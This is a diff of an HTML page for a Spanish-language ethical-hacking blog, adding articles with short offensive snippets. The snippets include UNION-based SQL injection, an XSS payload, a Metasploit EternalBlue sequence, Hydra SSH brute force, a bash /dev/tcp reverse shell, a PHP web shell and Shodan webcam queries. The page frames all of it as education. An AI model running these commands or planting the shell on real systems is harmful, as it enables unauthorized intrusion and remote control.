@@ -3,55 +3,104 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cyber Log</title>
+    <title>Cyber Log // Interceptando la Realidad //</title>
+    <meta name="description" content="Plataforma de investigación y recursos en ciberseguridad, hacking ético y análisis de sistemas.">
+    <meta name="keywords" content="ciberseguridad, hacking, seguridad informática, análisis de vulnerabilidades, exploits, payloads, pentesting, CTF, programación, código">
+    <meta name="author" content="Tu Nombre o Alias">
+    <meta property="og:title" content="Cyber Log // Interceptando la Realidad //">
+    <meta property="og:description" content="Plataforma de investigación y recursos en ciberseguridad, hacking ético y análisis de sistemas.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://tu-usuario.github.io/tu-repo/">
+
     <style>
-        /* Estética "Hacking" */
+        /* Estilos generales */
         body {
             background-color: #0d0208; /* Negro/Púrpura muy oscuro */
             color: #00ff00; /* Verde neón */
             font-family: 'Courier New', Courier, monospace;
             margin: 0;
             padding: 0;
+            overflow-x: hidden; /* Evitar scroll horizontal */
         }
 
+        /* Estilo del Scrollbar (para navegadores Webkit como Chrome, Safari) */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #0d0208;
+        }
+        ::-webkit-scrollbar-thumb {
+            background-color: #004d00;
+            border: 1px solid #00ff00;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background-color: #008000;
+        }
+
+        /* Contenedor principal del contenido */
         .container {
             width: 90%;
             max-width: 900px;
             margin: 20px auto;
             padding: 15px;
             border: 1px solid #00ff00;
-            box-shadow: 0 0 15px #00ff00;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.7); /* Sombra más pronunciada */
+            position: relative; /* Para que el contenido esté por encima del canvas */
+            z-index: 10; /* Asegura que el contenido esté por encima del canvas */
+            background-color: rgba(13, 2, 8, 0.85); /* Fondo semitransparente para ver la lluvia */
+        }
+
+        /* Canvas para el efecto de lluvia de código */
+        #matrixCanvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 0; /* Asegura que el canvas esté detrás del contenido */
+            pointer-events: none; /* No interfiere con clics */
         }
 
         header {
             text-align: center;
             border-bottom: 1px dashed #00ff00;
-            padding-bottom: 10px;
+            padding-bottom: 15px;
+            margin-bottom: 20px;
         }
 
-        /* Título con efecto de "escritura" */
+        /* Título principal con efecto de "escritura" */
         #main-title {
-            font-size: 2.5em;
-            text-shadow: 0 0 5px #00ff00;
-            min-height: 50px; /* Espacio para el efecto de escritura */
+            font-size: 2.8em;
+            text-shadow: 0 0 8px #00ff00, 0 0 15px rgba(0, 255, 0, 0.5);
+            min-height: 60px; /* Espacio suficiente para el título */
+            display: inline-block; /* Para que el cursor parpadeante se alinee */
         }
 
         h2, h3 {
             color: #00ff00;
             border-bottom: 1px solid #00ff00;
-            padding-bottom: 5px;
+            padding-bottom: 8px;
+            margin-top: 30px;
+            text-shadow: 0 0 5px rgba(0, 255, 0, 0.5);
         }
 
-        /* Contenedor de "publicaciones" */
         main {
             margin-top: 20px;
         }
 
         article {
-            background-color: #0a1a0a; /* Fondo oscuro para legibilidad */
+            background-color: rgba(0, 26, 0, 0.4); /* Fondo más transparente */
             border: 1px solid #004d00;
-            padding: 15px;
-            margin-bottom: 20px;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
+            padding: 20px;
+            margin-bottom: 30px;
+            transition: transform 0.2s ease-in-out; /* Pequeño efecto al pasar el ratón */
+        }
+
+        article:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
         }
 
         /* Bloques de código */
@@ -59,9 +108,12 @@
             background-color: #000;
             color: #f0f0f0;
             border: 1px solid #00ff00;
-            padding: 10px;
-            overflow-x: auto; /* Para que el código no se salga */
+            padding: 15px;
+            overflow-x: auto;
             font-family: 'Consolas', 'Monaco', monospace;
+            white-space: pre-wrap; /* Para que el código largo se ajuste */
+            word-wrap: break-word; /* Romper palabras largas en el código */
+            box-shadow: 0 0 8px rgba(0, 255, 0, 0.4);
         }
 
         code {
@@ -73,79 +125,250 @@
             max-width: 100%;
             height: auto;
             border: 1px solid #00ff00;
-            margin-top: 10px;
+            margin-top: 15px;
+            display: block; /* Centrar la imagen */
+            margin-left: auto;
+            margin-right: auto;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
         }
 
         /* Pie de página con las reglas */
         footer {
-            margin-top: 20px;
+            margin-top: 40px;
             border-top: 1px dashed #00ff00;
-            padding-top: 10px;
-            font-size: 0.8em;
+            padding-top: 20px;
+            font-size: 0.9em;
             text-align: center;
+            color: #ccc;
         }
 
         footer h3 {
-            color: #ff0000; /* Rojo para advertencias */
-            border: none;
+            color: #ff0000; /* Rojo vibrante para advertencias */
+            border-bottom: 1px solid #ff0000;
+            margin-bottom: 15px;
+            text-shadow: 0 0 5px rgba(255, 0, 0, 0.7);
         }
 
         footer p {
             color: #aaa;
+            line-height: 1.5;
         }
 
     </style>
 </head>
 <body>
 
-    <div class="container">
+    <canvas id="matrixCanvas"></canvas> <div class="container">
         <header>
-            <h1 id="main-title"></h1> </header>
+            <h1 id="main-title"></h1>
+        </header>
 
         <main>
             <h2>// Últimos Archivos //</h2>
 
             <article>
-                <h3>Análisis de un script de Python simple</h3>
-                <p>Este es un ejemplo de cómo mostrar código. El siguiente script escanea puertos abiertos en una IP local. Útil para auditorías de red básicas.</p>
+                <h3>[ TÍTULO DE TU ARTÍCULO 1 ]</h3>
+                <p>Aquí va la introducción o una descripción de tu contenido. Puedes hablar sobre una técnica, una herramienta, un exploit, o un análisis de vulnerabilidad.</p>
+                
+                <pre><code>
+# Este es un ejemplo de código en Python.
+# Puedes poner aquí cualquier lenguaje: Python, C, Bash, etc.
+
+def ejemplo_funcion(parametro):
+    print(f"Recibí: {parametro}")
+    if parametro == "hack":
+        print("¡Iniciando secuencia!")
+    else:
+        print("Esperando entrada...")
+
+ejemplo_funcion("test")
+                </code></pre>
+
+                <p>Puedes añadir imágenes para ilustrar tu artículo. Asegúrate de que el nombre del archivo de la imagen sea correcto y que esté en el mismo directorio que tu `index.html` en GitHub.</p>
+                <img src="Imagen1.png" alt="Descripción de la imagen 1">
+                <p>Continúa con más detalles o conclusiones sobre el tema.</p>
+            </article>
+            <article>
+                <h3>Análisis de un script de Python simple (Scan de Puertos)</h3>
+                <p>Este es un ejemplo de cómo mostrar código. El siguiente script escanea puertos abiertos en una IP local. Útil para auditorías de red básicas y demostraciones de conectividad.</p>
                 
                 <pre><code>
 import socket
 
-def scan_port(port):
+def scan_port(ip, port):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(0.1)
-        if s.connect_ex(('127.0.0.1', port)) == 0:
-            print(f"[+] Puerto {port} abierto")
+        s.settimeout(0.1) # Reducir el tiempo de espera
+        result = s.connect_ex((ip, port))
+        if result == 0:
+            print(f"[+] Puerto {port} en {ip} ABIERTO")
         s.close()
     except Exception as e:
+        # print(f"Error escaneando puerto {port}: {e}") # Para depuración
         pass
 
-for port in range(1, 1025):
-    scan_port(port)
+target_ip = '127.0.0.1' # Cambia esto a la IP que quieras escanear (con permiso)
+print(f"Escaneando puertos en {target_ip}...")
+for port in range(1, 1025): # Escanea los puertos bien conocidos
+    scan_port(target_ip, port)
+print("Escaneo completado.")
                 </code></pre>
 
-                <p>Aquí puedes añadir una imagen explicativa del proceso. Para que la imagen "Imagen1.png" funcione, debes subir ese archivo al mismo directorio de tu repositorio en GitHub.</p>
-                
-                <img src="Imagen1.png" alt="Diagrama de red de ejemplo">
-
+                <p>Una imagen aquí podría mostrar un diagrama de cómo funciona un escaneo de puertos o una captura de pantalla del script en acción.</p>
+                <img src="https://via.placeholder.com/600x300/004d00/00ff00?text=Diagrama+Scan+Puertos" alt="Diagrama de un escaneo de puertos">
+                <p>Es fundamental recordar que este tipo de herramientas deben usarse de forma ética y legal.</p>
             </article>
 
             <article>
-                <h3>Concepto: Inyección SQL</h3>
-                <p>Una breve descripción de lo que es una inyección SQL y por qué es peligrosa. El propósito de esta sección es educativo, para entender la vulnerabilidad y cómo prevenirla (usando sentencias preparadas).</p>
-                <pre><code>' OR '1'='1</code></pre>
+                <h3>Concepto: Inyección SQL Avanzada</h3>
+                <p>Profundicemos en la inyección SQL, una de las vulnerabilidades más comunes. No solo consiste en `' OR '1'='1`, sino en extraer bases de datos enteras o manipular la lógica de una aplicación. Aquí un ejemplo conceptual de UNION-based SQLi.</p>
+                <pre><code>
+' ORDER BY 1-- -
+' UNION SELECT @@version, user(), database()-- -
+                </code></pre>
+                <p>Este fragmento ilustra cómo un atacante podría intentar obtener información sobre la base de datos (versión, usuario actual, nombre de la DB) si la aplicación es vulnerable a inyecciones SQL ciegas o basadas en errores.</p>
+            </article>
+
+            <article>
+                <h3>Payload XSS Básico</h3>
+                <p>Cross-Site Scripting (XSS) permite inyectar scripts maliciosos en páginas web. Un payload reflejado simple podría ser:</p>
+                <pre><code>
+&lt;script&gt;alert('XSS exitoso!')&lt;/script&gt;
+                </code></pre>
+                <p>Este ejemplo solo muestra una alerta, pero un atacante podría robar cookies de sesión o redirigir al usuario.</p>
+            </article>
+
+            <article>
+                <h3>Comprendiendo Metasploit: Un Resumen</h3>
+                <p>Metasploit Framework es una herramienta poderosa para el desarrollo y ejecución de exploits. No es solo una herramienta de "hacking", sino una plataforma de prueba de penetración. Aquí un ejemplo de uso básico del módulo `msfconsole` para buscar vulnerabilidades:</p>
+                <pre><code>
+msfconsole
+search type:exploit platform:windows smb
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.100
+set LHOST 192.168.1.5
+exploit
+                </code></pre>
+                <p>Este es un flujo de trabajo típico para un pentester que intenta usar un exploit conocido como EternalBlue. La comprensión profunda de cómo funciona cada paso es crucial.</p>
+            </article>
+
+            <article>
+                <h3>Fuerza Bruta SSH con Hydra</h3>
+                <p>Hydra es una herramienta popular para ataques de fuerza bruta. Aquí se muestra cómo intentar adivinar credenciales SSH (Secure Shell) usando un diccionario de contraseñas.</p>
+                <pre><code>
+hydra -L users.txt -P passwords.txt ssh://192.168.1.1 --json output.json
+                </code></pre>
+                <p>El uso de `users.txt` y `passwords.txt` debe ser siempre con fines éticos y sobre sistemas con autorización explícita.</p>
+            </article>
+
+            <article>
+                <h3>Introducción a los Payloads (Concepto)</h3>
+                <p>En ciberseguridad, un payload es la parte de un exploit que realiza la acción deseada por el atacante (ej. obtener una shell inversa, cargar malware). No es el exploit en sí, sino lo que el exploit "entrega". Un payload sencillo para una shell inversa de Bash podría ser:</p>
+                <pre><code>
+bash -i >& /dev/tcp/192.168.1.5/4444 0>&1
+                </code></pre>
+                <p>Este comando conecta una shell de Bash a una IP y puerto específicos. Esto se debe usar SOLO en entornos controlados y con permiso explícito.</p>
+            </article>
+
+            <article>
+                <h3>Enumeración de Directorios con Dirb/Dirbuster</h3>
+                <p>Dirb y Dirbuster son herramientas para escanear directorios y archivos ocultos en servidores web. Esto ayuda a descubrir puntos de entrada o información sensible.</p>
+                <pre><code>
+dirb http://target.com /usr/share/wordlists/dirb/common.txt
+                </code></pre>
+                <p>La imagen aquí podría ser una captura de pantalla de Dirb ejecutándose o un diagrama de cómo funciona la enumeración de directorios.</p>
+                <img src="https://via.placeholder.com/600x300/004d00/00ff00?text=Enumeracion+Dirb" alt="Captura de pantalla de Dirb">
+            </article>
+
+            <article>
+                <h3>Explicando el OWASP Top 10 (Ejemplo de A01:2021 - Broken Access Control)</h3>
+                <p>El OWASP Top 10 es una lista de las vulnerabilidades de seguridad web más críticas. "Broken Access Control" ocurre cuando los usuarios pueden acceder a funciones o datos sin la autorización adecuada.</p>
+                <pre><code>
+# URL vulnerable donde un usuario no administrador puede ver el perfil de administrador
+GET /admin/users/edit?id=1 HTTP/1.1
+Cookie: sessionid=ABCD123
+                </code></pre>
+                <p>Si un usuario normal puede cambiar `id=1` (que es el administrador) o acceder a `/admin/` sin ser un admin, eso es control de acceso roto.</p>
+            </article>
+
+            <article>
+                <h3>Reconocimiento Pasivo con Shodan</h3>
+                <p>Shodan es un motor de búsqueda para dispositivos conectados a Internet. Permite el reconocimiento pasivo al buscar por IPs, puertos abiertos, servicios y vulnerabilidades sin interactuar directamente con el objetivo.</p>
+                <pre><code>
+# Búsqueda de cámaras web con título "webcamXP"
+webcamXP country:"US"
+
+# Búsqueda de servidores Apache con puerto 8080 abierto
+apache port:8080
+                </code></pre>
+                <p>Shodan es una herramienta increíblemente útil para ver la huella digital de una organización.</p>
+            </article>
+
+            <article>
+                <h3>Uso Básico de Nmap</h3>
+                <p>Nmap (Network Mapper) es una utilidad gratuita y de código abierto para el descubrimiento de redes y auditorías de seguridad. Aquí un comando básico para un escaneo de puertos agresivo:</p>
+                <pre><code>
+nmap -A -T4 192.168.1.1/24
+                </code></pre>
+                <p>El argumento `-A` habilita la detección del sistema operativo, la detección de versiones, el escaneo de scripts y el traceroute. `-T4` acelera el escaneo.</p>
+            </article>
+
+            <article>
+                <h3>Entendiendo Phishing (Concepto)</h3>
+                <p>El phishing es una técnica de ingeniería social para engañar a las personas y obtener información sensible, como nombres de usuario, contraseñas y detalles de tarjetas de crédito. No hay un "código" per se, pero se basa en la manipulación.</p>
+                <pre><code>
+# Ejemplo conceptual de una URL de phishing
+http://login-banco-falso.com/login.php?return_to=banco-real.com
+                </code></pre>
+                <p>La clave es la suplantación de identidad y la creación de una falsa sensación de urgencia o credibilidad.</p>
+            </article>
+
+            <article>
+                <h3>Exploit Kit (Concepto)</h3>
+                <p>Un exploit kit es una suite de software automatizada que explota vulnerabilidades en el software cliente (navegadores, plugins) para instalar malware. Son la base de muchas infecciones drive-by-download.</p>
+                <p>No se puede proporcionar un código, pero es importante entender cómo funcionan para implementar defensas robustas, como mantener el software actualizado.</p>
+                <img src="https://via.placeholder.com/600x300/004d00/00ff00?text=Flujo+Exploit+Kit" alt="Flujo de un Exploit Kit">
+            </article>
+
+            <article>
+                <h3>Herramientas para Hashing de Contraseñas (Ejemplo Python)</h3>
+                <p>El hashing es fundamental para almacenar contraseñas de forma segura. Nunca se deben guardar contraseñas en texto plano. Aquí un ejemplo en Python usando `bcrypt`.</p>
+                <pre><code>
+import bcrypt
+
+password = b"mi_contrasena_segura"
+hashed_password = bcrypt.hashpw(password, bcrypt.gensalt())
+
+print(f"Contraseña original: {password}")
+print(f"Contraseña hasheada: {hashed_password}")
+
+# Para verificar
+if bcrypt.checkpw(password, hashed_password):
+    print("¡Contraseña verificada correctamente!")
+else:
+    print("Contraseña incorrecta.")
+                </code></pre>
+                <p>Este código demuestra cómo hashear y verificar contraseñas, una práctica crucial en la seguridad de aplicaciones.</p>
+            </article>
+            
+            <article>
+                <h3>Web Shells: Acceso Persistente (Concepto)</h3>
+                <p>Una web shell es un script malicioso subido a un servidor web que permite a un atacante ejecutar comandos de forma remota a través del navegador. Es una forma de mantener el acceso.</p>
+                <pre><code>
+&lt;?php system($_GET['cmd']); ?&gt;
+                </code></pre>
+                <p>Este es un ejemplo muy simple de una web shell PHP. Si se sube a un servidor vulnerable, un atacante podría ir a `http://victim.com/shell.php?cmd=ls -la` para listar directorios.</p>
             </article>
 
         </main>
 
         <footer>
-            <h3>[ REGLAS Y PROTOCOLO ]</h3>
-            <p><strong>Aviso Importante:</strong> Todo el contenido compartido en este sitio es estrictamente para **fines educativos y de investigación** en ciberseguridad.</p>
-            <p>El administrador de este sitio no se hace responsable del mal uso de la información o las herramientas aquí presentadas. Cualquier acción realizada con esta información es responsabilidad exclusiva del usuario.</p>
-            <p>El uso de este conocimiento para atacar sistemas sin permiso explícito es ilegal y no ético.</p>
-            <p>// El conocimiento es libre, úsalo con responsabilidad //</p>
+            <h3>[ PROTOCOLO DE CONCIENCIA CYBERNÉTICA ]</h3>
+            <p><strong>Clasificación: ALTO SECRETO // Solo para Fines Educativos //</strong></p>
+            <p>Este repositorio digital ha sido creado para la **difusión responsable de conocimiento** en el campo de la ciberseguridad, el hacking ético y la investigación de vulnerabilidades. Los materiales aquí expuestos están diseñados para fomentar la comprensión y la protección de sistemas, no para su explotación maliciosa.</p>
+            <p><strong>Advertencia de Responsabilidad:</strong> El creador y mantenedor de este nodo no asume ninguna responsabilidad por el uso indebido, ilegal o no autorizado de la información, técnicas o fragmentos de código compartidos. Cualquier acción que contravenga las leyes locales o internacionales, o que viole la privacidad y la integridad de sistemas ajenos sin consentimiento explícito, es estrictamente reprobable y recae **exclusivamente en la conciencia del usuario.**</p>
+            <p>Se espera que los visitantes actúen con **integridad, ética y respeto** por la ley y la propiedad digital.</p>
+            <p>// El conocimiento es una herramienta: su impacto depende de las manos que lo empuñen //</p>
         </footer>
 
     </div>
@@ -153,3 +376,4 @@ for port in range(1, 1025):
     <script src="script.js"></script>
 </body>
 </html>
+
